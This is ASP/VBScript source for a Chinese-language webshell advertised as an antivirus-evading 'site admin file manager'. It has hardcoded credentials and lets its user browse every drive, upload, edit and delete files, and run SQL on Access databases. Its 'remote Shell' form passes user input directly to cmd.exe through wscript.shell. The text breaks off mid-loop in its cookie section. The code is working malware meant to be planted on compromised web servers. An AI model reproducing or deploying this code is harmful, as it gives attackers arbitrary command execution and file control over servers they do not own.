<%@ LANGUAGE = VBScript CodePage = 936%>
<%
option explicit
Response.Buffer=True
Server.Scripttimeout=5000
':::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
':::::新杀客助手功能增强免杀版:::::::::::::::::::::::::::::::::::::::::::::::
':::::使用本程序的前提是服务器必须安装文本读写组件（FSO）:::::::::::
':::::黑网之神 ：著::::::::::::::::::::::::::::::::::::::
':::::查找[UserName]="killbase.com"；默认值为[killbase.com]:::::::::::::::::::::::::
':::::查找[UserPassword]="killbase.com"；默认值为killbase.com :::::::::::::::::::
':::::欢迎访问我的网站：www.killbase.com :::::::::::::::::::::::::
':::::欢迎访问我们论坛 bbs.killbase.com：:::::::::::::::::::::::::::::::
':::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>...::::::新杀客助手ASP站长文件管理助手::::::...</title>
<style>
<!--
a            { color: #000080; font-size: 10pt; text-decoration: blink }
a:hover      { color: #9966FF; text-decoration: blink; font-size: 10pt; font-family: 宋体 }
a:active     { font-family: 宋体; font-size: 10pt; text-decoration: blink; color: #000080 }
a:link       { color: #000080; font-family: 宋体; font-size: 10pt; text-decoration:blink }
table        { font-family: 宋体; font-size: 10pt; word-break: break-all}
td           { font-family: 宋体; font-size: 10pt; word-break: break-all}
textarea     { font-family: 宋体; font-size: 10pt}
input        { color: #000080; border: 1px solid #000000; background-color: #F7F7F7; word-break: break-all}
.button       { color: #000000; border: 1px outset #000000; background-color: #C0C0C0; word-break: break-all}
.table1      { font-family: 宋体; font-size: 10pt; border: 1px solid #F6F6F6; word-break: break-all}
.td1         { font-family: 宋体; font-size: 10pt; border: 1px solid #F6F6F6; word-break: break-all}
th         { font-family: 宋体; font-size: 10pt; border: 1px solid #F6F6F6; background-color:#D1D1E0; word-break: break-all}
-->
</style>
<script language="javascript">
<!--
function InSQLString(SQLStrings){
document.DatePathForm.SQLString.value = SQLStrings;
//alert(SQLStrings)
}

function ShowWin(Url,Name,X,Y,K){
if (!K==""){
 var Ask=confirm("您确实要进行"+K+"操作吗？也许会带来不必要的麻烦；请慎重。");
    if (Ask){
	window.open(Url,Name,"toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,width="+X+",height="+Y);
	return false;
	}
	
}
if (K==""){
window.open(Url,Name,"toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,width="+X+",height="+Y);
}
}


function setid()
{
var str=""
if(!window.PutFileForm.upcount.value==0)
for(i=1;i<=window.PutFileForm.upcount.value;i++)
str+='本地文件'+i+':<input type=file name=file'+i+' size=37><br>';
document.getElementById("nStr").innerHTML= str;
}

function PostSrt(){
var MyRegExp = document.getElementById("nStr").innerHTML
    MyRegExp = MyRegExp.replace(/<!--/ig, "")
    MyRegExp = MyRegExp.replace(/\/\/-->/ig, "");
	//alert(document.getElementById("nStr").innerHTML)
document.EditFileForm.FileStr.value = MyRegExp
}
//-->
</script>
</head>
<body>
<%
'::::::::::::::声明公共变量:::::::::::::::::::::

Dim FileName, oPath, allPath, SpPath, Obj
FileName = Request.Servervariables("PATH_INFO")
oPath = Request.Servervariables("APPL_PHYSICAL_PATH")
allPath = Request.Servervariables("PATH_TRANSLATED")
'得到主执行文件名
SpPath = Right(allPath,Len(allPath)-InstrRev(allPath,"\"))
Set Obj = CreateObject("Scripting.FileSystemObject")
'Response.Write "<br>1."&FileName&"<br>2."&oPath&"<br>3."&allPath
dim Data_5xsoft
On Error Resume Next
Class upload_5xsoft
  
dim objForm,objFile,Version

Public function Form(strForm)
   strForm=lcase(strForm)
   if not objForm.exists(strForm) then
     Form=""
   else
     Form=objForm(strForm)
   end if
 end function

Public function File(strFile)
   strFile=lcase(strFile)
   if not objFile.exists(strFile) then
     set File=new FileInfo
   else
     set File=objFile(strFile)
   end if
 end function


Private Sub Class_Initialize 
  dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
  dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
  dim iFindStart,iFindEnd
  dim iFormStart,iFormEnd,sFormName
  Version="化境HTTP上传程序 Version 2.0"  '非本人所创,该函数为原作者成果,就此感谢!
  set objForm=Server.CreateObject("Scripting.Dictionary")
  set objFile=Server.CreateObject("Scripting.Dictionary")
  if Request.TotalBytes<1 then Exit Sub
  set tStream = Server.CreateObject("adodb.stream")
  set Data_5xsoft = Server.CreateObject("adodb.stream")
  Data_5xsoft.Type = 1
  Data_5xsoft.Mode =3
  Data_5xsoft.Open
  Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
  Data_5xsoft.Position=0
  RequestData =Data_5xsoft.Read 

  iFormStart = 1
  iFormEnd = LenB(RequestData)
  vbCrlf = chrB(13) & chrB(10)
  sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
  iStart = LenB (sStart)
  iFormStart=iFormStart+iStart+1
  while (iFormStart + 10) < iFormEnd 
	iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
	tStream.Type = 1
	tStream.Mode =3
	tStream.Open
	Data_5xsoft.Position = iFormStart
	Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
	tStream.Position = 0
	tStream.Type = 2
	tStream.Charset ="gb2312"
	sInfo = tStream.ReadText
	tStream.Close
	'取得表单项目名称
	iFormStart = InStrB(iInfoEnd,RequestData,sStart)
	iFindStart = InStr(22,sInfo,"name=""",1)+6
	iFindEnd = InStr(iFindStart,sInfo,"""",1)
	sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
	'如果是文件
	if InStr (45,sInfo,"filename=""",1) > 0 then
		set theFile=new FileInfo
		'取得文件名
		iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
		iFindEnd = InStr(iFindStart,sInfo,"""",1)
		sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
		theFile.FileName=getFileName(sFileName)
		theFile.FilePath=getFilePath(sFileName)
		'取得文件类型
		iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
		iFindEnd = InStr(iFindStart,sInfo,vbCr)
		theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
		theFile.FileStart =iInfoEnd
		theFile.FileSize = iFormStart -iInfoEnd -3
		theFile.FormName=sFormName
		if not objFile.Exists(sFormName) then
		  objFile.add sFormName,theFile
		end if
	else
	'如果是表单项目
		tStream.Type =1
		tStream.Mode =3
		tStream.Open
		Data_5xsoft.Position = iInfoEnd 
		Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
		tStream.Position = 0
		tStream.Type = 2
		tStream.Charset ="gb2312"
	        sFormValue = tStream.ReadText 
	        tStream.Close
		if objForm.Exists(sFormName) then
		  objForm(sFormName)=objForm(sFormName)&", "&sFormValue		  
		else
		  objForm.Add sFormName,sFormValue
		end if
	end if
	iFormStart=iFormStart+iStart+1
	wend
  RequestData=""
  set tStream =nothing
End Sub

Private Sub Class_Terminate  
 if Request.TotalBytes>0 then
	objForm.RemoveAll
	objFile.RemoveAll
	set objForm=nothing
	set objFile=nothing
	Data_5xsoft.Close
	set Data_5xsoft =nothing
 end if
End Sub
   
 
 Private function GetFilePath(FullPath)
  If FullPath <> "" Then
   GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
  Else
   GetFilePath = ""
  End If
 End  function
 
 Private function GetFileName(FullPath)
  If FullPath <> "" Then
   GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
  Else
   GetFileName = ""
  End If
 End  function
End Class

Class FileInfo
  dim FormName,FileName,FilePath,FileSize,FileType,FileStart
  Private Sub Class_Initialize 
    FileName = ""
    FilePath = ""
    FileSize = 0
    FileStart= 0
    FormName = ""
    FileType = ""
  End Sub
  
 Public function SaveAs(FullPath)
    dim dr,ErrorChar,i
    SaveAs=true
    if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
    set dr=CreateObject("Adodb.Stream")
    dr.Mode=3
    dr.Type=1
    dr.Open
    Data_5xsoft.position=FileStart
    Data_5xsoft.copyto dr,FileSize
    dr.SaveToFile FullPath,2
    dr.Close
    set dr=nothing 
    SaveAs=false
  end function
  End Class


Public Function Show(ErrString)
Response.Write "<FONT COLOR='#FF0000'><li>"&ErrString&"</FONT><br>"
Response.Write "<br><CENTER><INPUT type='text' name='T1' size='15' style='color: #000080; font-family: 宋体; font-weight: bold; background-color: #FFFFFF; border: 1 double #FFFFFF'>"&Chr(13)
Response.Write "<SCRIPT LANGUAGE='vbScript'>"&Chr(13)&_
"Dim l,t1,t2,thetime,isStop"&Chr(13)&_    
"t1=timer+3"&Chr(13)&_
"isStop = False"&Chr(13)&_ 
"Sub tx()"&Chr(13)&_
"if isStop then"&Chr(13)&_
"exit Sub"&Chr(13)&_
"else"&Chr(13)&_
"setTimeout""tx()"",""1000"""&Chr(13)&_
"end if"&Chr(13)&_    
"t2=timer"&Chr(13)&_
"thetime=int(t1)-int(t2)"&Chr(13)&_            
"document.all.T1.value=thetime&"" 秒钟后关闭本窗口！http://www.killbase.com/"""&Chr(13)&_
"if thetime=""0"" or thetime<""0"" then"&Chr(13)&_
"window.close()"&Chr(13)&_
"isStop=True"&Chr(13)&_
"end if"&Chr(13)&_
"End Sub"&Chr(13)&_
"Call tx()"&Chr(13)&_
"</SCRIPT></CENTER>"
End Function
'防止主执行文件被操作!
Public Function IsRoot(PathStr)
If Lcase(PathStr) = Lcase(allPath) Then
Show("不能对主执行程序进行操作;本操作已经被禁止.")
Response.End
End If
End Function
Function IsObjInstalled(strClassString)
	On Error Resume Next
	IsObjInstalled = False
	Err = 0
	Dim xTestObj
	Set xTestObj = Server.CreateObject(strClassString)
	If 0 = Err Then IsObjInstalled = True
	Set xTestObj = Nothing
	Err = 0
End Function


%> <div align="center"><table border="0" width="450" id="table1" cellspacing="0"><tr><td><%
If Request.QueryString("Work") = "outlogin" Then
   Session("UserCokis_Name") =""
   Session("UserCokis_Pass") =""
   Show("退出成功!")
   Response.Write"<script>opener.window.location.reload()</script>"
   Response.end
End If
If Session("UserCokis_Name") ="" Or Session("UserCokis_Pass") ="" Then
Response.Write"<form method='POST' action='"&Filename&"?Work=login' name='LoginForm'>"&_
"<p align='center'>用户名：<input type='text' name='MyName' size='10'>"&Chr(13)&"验证码：<input type='password' name='MyPass' size='10'>"&Chr(13)&"<input type='submit' value='登陆' name='B1' class='button'></p></form>"

If Request.QueryString("Work") = "login" Then
  Dim UserName,UserPassword,PostName,PostPW
   PostName = Trim(Request("MyName"))
   PostPW = Request("MyPass")
   UserName = "killbase.com"
   UserPassword = "killbase.com"
 If UserName = PostName  And UserPassword = PostPW  Then
   Session("UserCokis_Name") = PostName
   Session("UserCokis_Pass") = PostPW
   Response.Redirect Filename
Else
   Response.Write "<p align='center'><font color=red>验证未通过！</font></p>"
 End If
 
End If
If Not IsObjInstalled("Scripting.FileSystemObject") Then
Response.Write"<li>非常遗憾，本服务器不支持FSO。本程序全部功能无法运行！http://www.killbase.com/"
Response.End
Else
Response.Write"<li>本服务器支持FSO！您可以使用本程序进行远程网站文件管理操作。www.killbase.com/<br>"
Response.Write"<li>为了防止被意外删除，建议本文件应安装在网站的根目录下。"
End If

Else
Sub SaveUp()
Dim Upload,File,Formname,Formpath,Icount
Icount = 0
Set Upload=New Upload_5xsoft ''建立上传对象
If Upload.Form("PutPaht")="" Then   ''得到上传目录
 Show("请输入要上传的目录!")
 Set Upload=Nothing
Else
 Formpath=Upload.Form("PutPaht")
 If Right(Formpath,1)<>"\" Then Formpath=Formpath&"\" 
End If
For Each Formname In Upload.Objfile ''列出所有上传了的文件
 Set File=Upload.File(Formname)  ''生成一个文件对象
If File.Filesize > 0 Then         ''如果 Filesize > 0 说明有文件数据
  File.Saveas Formpath&File.Filename  ''保存文件
  Response.Write "<li>本地文件："&File.Filepath&File.Filename&"<br>"
  Response.Write "<li>大小："
     If Formatnumber(File.Filesize/1024)< 1 then
       Response.Write"0"&Formatnumber(File.Filesize/1024)
     Else
       Response.Write Formatnumber(File.Filesize/1024) 
     End If
  Response.Write "(KB)<br><li>成功上传到："&Formpath&File.Filename&"<br>"
  Icount=Icount+1
End If
 Set File=Nothing
Next
Set Upload=Nothing  ''删除此对象
If Icount>0 Then
Show("共有："&Icount&" 个文件成功上传。")
Response.Write"<script>opener.window.location.reload()</script>"
Else
Show("没有文件上传")
End If
End Sub

%> <%Sub UpFileWim(PutPath)%> <table border="1" width="100%" id="table2" class="td1"><tr><form method="POST" action="<%=FileName%>?Work=PutFile" name="PutFileForm" enctype="multipart/form-data"><th colspan="2">文件上传</th></tr><tr><td class="td1" align="right" width="16%">上传路径:</td><td class="td1" width="81%"><input type="text" name="PutPaht" size="50" value="<%=PutPath%>" ReadOnly></td></tr><tr><td class="td1" align="right" width="16%">上传个数:</td><td class="td1" width="81%"><input type="text" name="upcount" size="10" value="1" maxlength="1"> <input type="button" name="Bn" onclick="setid();" value="设定" class="button"> (<FONT COLOR="#FF0000">只能同时上传9个以下的文件.</FONT>) </td></tr><tr><td class="td1" align="center" colspan="2"><SPAN id="nStr"></SPAN></td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="确定上传" name="B1" class="button"></td></form></tr></table><%End Sub%> <%
Sub SaveFolder(FolderPath,FolderName)
On Error Resume Next
If Instr(FolderPath,":")=0 Then
       FolderPath=Server.Mappath(FolderPath)
End If
If FolderName = "" Then
Show("请输入文件夹名称。")
	   Exit Sub
End If
If (Obj.FolderExists(FolderPath&"\"&FolderName)) Then
    Show("文件夹已经存在,不必再建立.")
	Exit Sub
  Else
    Obj.CreateFolder(FolderPath&"\"&FolderName)
	If Err Then
	 Show("无法建立文件夹.原因是:"&Err.Description)
	 Err.Clear
	 Exit Sub
	 Else
	Show("您已经成功地在"&FolderPath&"下建立名为:"&FolderName&"的文件夹.")
	Response.Write"<script>opener.window.location.reload()</script>"
	End If
  End If
End Sub
%> <%
Sub FolderWin(NewFolderPath)
%> <!--新建文件夹窗体界面开始-->　<table border="0" width="100%" id="table3" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=NewFolder" name="NewFolderForm"><th colspan="2">新建文件夹</th></tr><tr><td class="td1" width="15%" align="right">目标路径:</td><td class="td1" width="81%"><input type="text" name="FolderPath" size="51" value="<%=NewFolderPath%>" readOnly></td></tr><tr><td class="td1" width="15%" align="right">文件夹名:</td><td class="td1" width="81%"><input type="text" name="NewFolder" size="20" maxlength="20" value="<%=Date()%>">(<font color="#FF0000">注意:不要写得太长。</font>)</td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="提交" name="B2" class="button"></td></form></tr></table><!--新建文件夹窗体界面结束--><%End Sub%> <%
Sub SaveFile(SavePath,NewFileName)
On Error Resume Next
Dim f
If Instr(SavePath,":")=0 Then
       SavePath=Server.Mappath(SavePath)
End If
If NewFileName = "" Then
Show("文件名称不能为空。")
Exit Sub
End If
Set f = Obj.CreateTextFile(SavePath&"\"&NewFileName,False)
	If Err Then
	 Show("无法建立文件.原因是:"&Err.Description)
	 Err.Clear
	 Else
	Show("您已经成功地在"&SavePath&"下建立名为:"&NewFileName&"的文件.")
	Response.Write"<script>opener.window.location.reload()</script>"
	End If
End Sub
%> <%Sub FileWin(NewFilePath)%> <!--新建空文件窗体界面开始-->　<table border="0" width="100%" id="table5" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=NewFile" name="NewFileForm"><th colspan="2">新建一个空文件</th></tr><tr><td class="td1" align="right" width="15%">目标路径:</td><td class="td1" width="82%"><input type="text" name="FilePath" size="51" value="<%=NewFilePath%>" readOnly></td></tr><tr><td class="td1" align="right" width="15%">文件名称:</td><td class="td1" width="82%"><input type="text" name="NewFileName" size="20" maxlength="20" value="<%=Replace(Date(),"-","")&Replace(Time(),":","")%>.htm">(<font color="#FF0000">注意:填写完整名称及后缀名</font>)</td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="提交" name="B3" class="button"> </td></form></tr></table><!--新建空文件窗体界面结束--><%End Sub%> <%
Sub CopyFile(CopyPath,CopyName)
On Error Resume Next 
Dim cFile
If Instr(CopyName,":")=0 Then
       CopyName=Server.Mappath(CopyName)
End If
    Set cFile = Obj.GetFile(CopyPath)
    cFile.Copy (CopyName)
	If Err Then
	 Show("无法复制文件.原因是:"&Err.Description)
	 Err.Clear
	 Else
	Show("文件已经成功复制到:"&CopyName)
	Response.Write"<script>opener.window.location.reload()</script>"
	End If
End Sub
%> <%Sub CopyFileWin(CopyPath)%> <table border="0" width="100%" id="table6" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=CopyFiles" name="CopyForm"><th colspan="2">文件复制</th></tr><tr><td class="td1" width="17%" align="right">源文件：</td><td class="td1" width="80%"><input type="text" name="CopyPath" size="47" readonly value="<%=CopyPath%>"> </td></tr><tr><td class="td1" width="17%" align="right">目标文件：</td><td class="td1" width="80%"><input type="text" name="NewCopyName" size="47" value="<%=CopyPath%>"><br>(<font color="#FF0000">注意：必须是完整的相对路径或绝对路径及文件名和后缀名</font>)</td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="复制" name="B4" class="button"></td></form></tr></table><%End Sub%> <%Sub ListFileWin(ListPath)
On Error Resume Next 
If ListPath="" Then
ListPath = Server.Mappath("\")
End If
Dim AllFolder,ItFolserd,FL,dr
Set AllFolder = Obj.GetFolder(ListPath)
Set ItFolserd = AllFolder.SubFolders
%> <table border="0" width="100%" id="table4" class="table1" bgcolor="#F6F6F6" cellspacing="0" cellpadding="0"><tr><th colspan="2">文件及文件夹列表</th></tr><tr><td bgcolor="#EAEAEA" class="td1" colspan="2">当前路径:<%=ListPath%></td></tr><tr><td bgcolor="#F6F6F6" class="td1" colspan="2"><%
For Each Dr in Obj.Drives
Response.write "<a href='"&FileName&"?Work=ShowListFileWin&ListPath="&Dr.DriveLetter&":'>"&Dr.DriveLetter&"盘:</a>        "
NEXT
%> </td></tr><%
If Err Then
Show("遗憾;没有浏览权限;")
Exit Sub
Else
For Each FL in ItFolserd
%> <tr onmouseover="this.bgColor='#CCFF99';" onmouseout="this.bgColor='#F6F6F6'"><td class="td1" width="61%" title="文件夹: <%=FL.name%>"><font face="Wingdings" color="#FF9933">1</font> <A HREF="<%=FileName%>?Work=ShowListFileWin&ListPath=<%=ListPath&"\"&FL.name%>" title="创建时间:<%=FL.DateCreated&Chr(10)%>最后访问:<%=FL.DateLastAccessed&Chr(10)%>最后修改:<%=FL.DateLastModified&Chr(10)%>估计大小:<%=FL.size\1024%>(KB)"><%=FL.name%></A> </td><td class="td1" width="37%">&nbsp; [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowDelFolderwin&DelFolderPath=<%=replace(ListPath&"\"&FL.name,"\","\\")%>','FdelWin','500','150','删除')" title="删除[<%=FL.name%>]文件夹"><FONT COLOR="#FF0000">删除</FONT></A>]　</td></tr><%
Next
End If
Dim SiteUrl,Item
		  if ListPath = Server.MapPath("\") Then
		  SiteUrl = "/"
		  else
		  SiteUrl = "/"&Right(ListPath,Len(ListPath)-Len(oPath))&"/"
		  end if
		  Dim Ac
 For Each Item In AllFolder.Files 
%> <tr onmouseover="this.bgColor='#CCFF99';" onmouseout="this.bgColor='#F6F6F6'"><td height="17" class="td1" width="61%" title="文件: <%=Item.name%>"><font face="Wingdings" color="#FF0000">y</font> <A target="_blank" HREF="<%=SiteUrl&Item.name%>" title="创建时间:<%=Item.DateCreated&Chr(10)%>修改时间:<%=Item.DateLastModified&Chr(10)%>文件大小:<%If Formatnumber(Item.Size/1024)< 1 then Response.Write"0"&Formatnumber(Item.Size/1024) Else Response.Write Formatnumber(Item.Size/1024) End If%>(KB)"><%=Item.name%></A> </td><td height="17" class="td1" width="37%">　[<A HREF="#" onClick="JavaScript: ShowWin('<%=Filename%>?Work=ShowDelFilewin&DelPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','delWin','500','150','删除')" title="删除[<%=Item.name%>]文件"><FONT COLOR="#FF0000">删除</FONT></A>] [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowCopyFileWin&CopyPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','CopyWin','500','190','')" title="复制:<%=Item.name%>"><FONT COLOR='#FF9933'>复制</FONT></A>] 
<%
Ac = split(Item.name,".")
If Lcase(Ac(UBound(Ac,1)))="txt" Or Lcase(Ac(UBound(Ac,1)))="htm" Or Lcase(Ac(UBound(Ac,1)))="asa" Or Lcase(Ac(UBound(Ac,1)))="html" Or Lcase(Ac(UBound(Ac,1)))="shtml" Or Lcase(Ac(UBound(Ac,1)))="asp" Or Lcase(Ac(UBound(Ac,1)))="inc" Or Lcase(Ac(UBound(Ac,1)))="ini" Or Lcase(Ac(UBound(Ac,1)))="m3u"  Or Lcase(Ac(UBound(Ac,1)))="cer" Or Lcase(Ac(UBound(Ac,1)))="htr" Or Lcase(Ac(UBound(Ac,1)))="js" Or Lcase(Ac(UBound(Ac,1)))="css" Or Lcase(Ac(UBound(Ac,1)))="cdx" Then%> [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowEditFileWin&EditPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','EditWin','500','450','')" title="编辑[<%=Item.name%>]文件">编辑</A>] <%End if%> <%If  Lcase(Ac(UBound(Ac,1)))="mdb" Then %> [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowMdbWin&MdbPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','mdbWin','500','190','')" title="压缩[<%=Item.name%>]数据库"><FONT COLOR="#993300">压缩</FONT></A>] <%End If%> </td></tr><%Next%> <tr><td class="td1" align="center" colspan="2"><FONT COLOR="#009900"><li>提示:点击文件名即可 WEB 浏览访问! </FONT><br>[<a href="#" onClick="javascript:history.back();" title="返回上一个目录"><font color="#FF0000">向上</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowListFileWin&ListPath=<%=Replace(Server.Mappath("\"),"\","\\")%>','ListWin','500','500','')" title="返回根目录"><font color="#FF0000">返回根目录</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowUpFileWin&PutPath=<%=Replace(ListPath,"\","\\")%>','UpWin','500','300','','')" title="在本目录下上传文件"><font color="#FF0000">文件上传</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowFileWin&NewFilePath=<%=Replace(ListPath,"\","\\")%>','FileWin','500','190','','')" title="在本目录下新建空文件"><font color="#FF0000">新建文件</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowFolderWin&NewFolderPath=<%=Replace(ListPath,"\","\\")%>','FolderWin','500','190','','')" title="在本目录下新建文件夹"><font color="#FF0000">新建文件夹</font></a>] </td></tr></table><%End Sub%> <%
Sub SaveEditFile(ReFilePath,EditStrings)

On Error Resume Next
Dim MyWrite
Set MyWrite = Obj.OpenTextFile(ReFilePath, 2)
MyWrite.WriteLine(EditStrings)
If Err Then
Show("遗憾,没有操作权限.")
Else
Show("文件修改成功!")
End If
Set Obj = Nothing
End Sub
Sub EditFile(GetMyFilePath)
Call IsRoot(GetMyFilePath)
On Error Resume Next
Dim MyRead,Strings
Set MyRead = Obj.OpenTextFile(GetMyFilePath, 1, True, 0)
Strings = MyRead.ReadAll
MyRead.Close
'以下部分是针对打开HTML文档时的处理。
'将文档里的HTML注释标注去掉。
Strings = Replace(Strings,"<!--", "")
Strings = Replace(Strings,"//-->", "")
Strings = Replace(Strings,"-->", "")
%> <table border="0" width="100%" id="table11" class="table1"><tr><form method="POST" name="EditFileForm" action="<%=FileName%>?Work=PostEditFile&ReFilePath=<%=GetMyFilePath%>"><th>文件编辑</th></tr><tr><td class="td1">当前文件:<FONT COLOR="#FF3300"><%=GetMyFilePath%></FONT></td></tr><tr><td class="td1" align="center"><%Response.Write"<SPAN id='nStr' style='display:none'><!--"&Trim(Strings)&"//--></SPAN>"&Chr(13)%> <textarea rows="24" name="FileStr" cols="59"></textarea> </td></tr><tr><td class="td1">(<FONT COLOR="#FF0000">注意：在调出本文件内容的过程中，所有的"&lt;!--"、"//--&gt;"、"--&gt;"标记已经全部过滤！在编辑过程中必须要注意文件内容的完整性。</FONT>)</td></tr><tr><td class="td1" align="center"><input type="submit" value="提交" name="B10"></td></form></tr></table><SCRIPT LANGUAGE="JavaScript">
<!--
PostSrt()
//-->
</SCRIPT>
<%End Sub%> <%
'数据库关闭
Public Function CloseDate()
Conn.close
Set conn = Nothing
End Function
'Access连接
Public Function Access(Paths)
On Error Resume Next
dim conn,connstr
If Instr(Paths,":")=0 Then
       Paths=Server.Mappath(Paths)
End If
Set conn = Server.CreateObject("ADODB.Connection")
connstr="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Paths
conn.Open connstr
If Err Then
		err.Clear
		Call CloseDate()
		Response.Write "数据库连接出错，请选择正确的路径。"
		Response.End
End If
End Function

Public Function MyDataEdit()
Dim PostB1,MyRadio,DataPaht,User,Pass,SQLString
'连接 Or 执行
PostB = Request.Form("B5")
'数据库类型
MyRadio = Request.Form("DateType")
'数据库路径
DataPaht = Trim(Request.Form("DataPaht"))
'用户名
User = Request.Form("User")
Pass = Request.Form("Password")
'SQL语句
SQLString = Request.Form("SQLString")
'数据库连接开始:
Select Case MyRadio
       Case "Access"
       Call Access(DataPaht)
       Case "MsSQL"
Response.Write "MsSQL"
End Select
Select Case PostB
       Case "连接"
Response.Write "接连"
       Case "执行"
Response.Write "执行"
End Select
Response.Redirect Filename&"?Work=ShowGetDataWin&DatePaht="&DataPaht
End Function

%> <%Sub GetDataWin()
Dim DatePath,IsData
DatePath = Request("DatePaht")
%> 　<table border="1" width="100%" id="table7" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=CallData" name="DatePathForm"><th colspan="2">数据库操作</th></tr><%If DatePath = "" Then%> <tr><td class="td1" width="18%" align="right">目标数据库:</td><td class="td1" width="78%">(<font color="#FF0000">注意:填写相对路径或绝对路径</font>)<br><input type="text" name="DataPaht" size="49" value="/MyData.mdb"> <br>Access数据库:<input type="radio" name="DateType" value="Access" checked> 
		SQL数据库:<input type="radio" name="DateType" value="MsSQL"> </td></tr><tr><td class="td1" colspan="2" align="center">用户:<input type="text" name="User" size="17"> 密码:<input type="text" name="Password" size="17"></td></tr><tr><td class="td1" colspan="2" align="center"><input type="submit" value="连接" name="B5" class="button"></td></tr><%Else
'读取数据库的表
'Set Rsschema=conn.Openschema(20)
'Rsschema.Movefirst
'Do Until Rsschema.Eof
'If Rsschema("Table_type")="Table" Then
'response.write "<script>document.getElementById(""DataInfo"").innerHTML="&Rsschema("Table_name") & "<Br>"
'End If
'Rsschema.Movenext
'Loop
'Set conn=Nothing
%> <tr><td class="td1" width="18%" align="right">成功连接:</td><td class="td1" width="78%"><input type="text" name="DataPaht" size="47"value="<%=DatePath%>" readonly></td></tr><tr><td class="td1" colspan="2" align="center"><font color="#FF0000">SQL语句:</font><br>

<textarea rows="8" name="SQLString" cols="59"></textarea></td></tr><tr><td class="td1" colspan="2" align="center">[<a href="#" onclick='JavaScript:InSQLString("Create Table [数据表名称(字段1 类型1(长度),字段2 类型2(长度) …… )]")'>新建表</a>] [<a href="#" onclick='JavaScript:InSQLString("Drop Table [数据表名称]")'>删除表</a>] [<a href="#" onclick='JavaScript:InSQLString("Select * From [数据表] Where [字段名] Order by [字段名] [desc]")'>order by</a>] [<a href="#" onclick='JavaScript:InSQLString("Insert into [目标数据表] Select * From [源数据表]")'>复制数据</a>]<br>[<a href="#" onclick='JavaScript:InSQLString("Insert Into [数据表] (字段1,字段2,字段3 …) Valuess (值1,值2,值3 …)")'>添加数据</a>] [<a href="#" onclick='JavaScript:InSQLString("Delete From [数据表] Where [条件表达式]")'>删除数据</a>] [<a href="#" onclick='JavaScript:InSQLString("Update [数据表] Set [字段名]=[字段值] Where [条件表达式]")'>更新数据</a>] [<a href="#" onclick='JavaScript:InSQLString("Select * From [数据表]")'>读取数据</a>]</td></tr><tr><td class="td1" colspan="2" align="center"><div id="DataInfo">fffff</div></td></tr><tr><td class="td1" colspan="2" align="center"><input type="submit" value="执行" name="B5" class="button"></td></form></tr><%End If%> </table><%End Sub%> <%Sub ShellWin(MyCommand)%> 　<table border="1" width="100%" id="table8" class="table1"><tr><form method="POST" action="<%=Filename%>?Work=ShowShellForm" name="RunShellform"><th colspan="2">远程Shell执行</th></tr><tr><td class="td1" width="12%" align="right">命令行:</td><td class="td1" width="84%"><input type="text" name="Command" value="<%=MyCommand%>" size="50"></td></tr><tr><td class="td1" align="center" colspan="2"><textarea rows="8" name="S1" cols="59" readonly>
<%=Server.Createobject("wscript.shell").exec("cmd.exe /c "&MyCommand).stdout.readall%>
</textarea> </td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="执行" name="B8" class="button"></td></tr></table><%End Sub%> <%Sub CookieWin()%> <table border="1" width="100%" id="table9" class="table1"><tr><form method="POST" action="<%=Filename%>?Work=SetCookie" name="SetCookie"><th>设置Cookies</th></tr><tr><td class="td1"><font color="#FF0000">Response.Cookies("<input type="text" name="Cookie1" size="6">") ("<input type="text" name="Cookie2" size="6">") = ("<input type="text" name="Cookie3" size="6">")</font> <input type="submit" value="提交" name="B7" class="button"> </td></form></tr><tr><td class="td1"><B>当前本站点保存在你机上的所有Cookies如下：</B><br><%
Dim Items
For Each Items In Request.Cookies 
If Request.Cookies(Items).Haskeys Then 
For Each Itemkey In Request.Cookies(Items) 
